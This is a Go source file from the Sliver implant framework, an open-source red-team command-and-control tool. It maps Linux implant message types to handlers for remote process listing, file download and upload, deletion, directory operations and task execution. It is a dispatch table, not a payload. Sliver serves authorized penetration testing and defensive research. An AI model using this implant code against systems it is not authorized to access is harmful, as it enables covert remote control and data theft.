package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import ( // {{if .Debug}}
	// {{else}}{{end}}
	pb "github.com/bishopfox/sliver/protobuf/sliver"
)

var (
	linuxHandlers = map[uint32]RPCHandler{
		pb.MsgPsReq:       psHandler,
		pb.MsgPing:        pingHandler,
		pb.MsgLsReq:       dirListHandler,
		pb.MsgDownloadReq: downloadHandler,
		pb.MsgUploadReq:   uploadHandler,
		pb.MsgCdReq:       cdHandler,
		pb.MsgPwdReq:      pwdHandler,
		pb.MsgRmReq:       rmHandler,
		pb.MsgMkdirReq:    mkdirHandler,
		pb.MsgTask:        taskHandler,
		pb.MsgRemoteTask:  remoteTaskHandler,
	}
)

func GetSystemHandlers() map[uint32]RPCHandler {
	return linuxHandlers
}
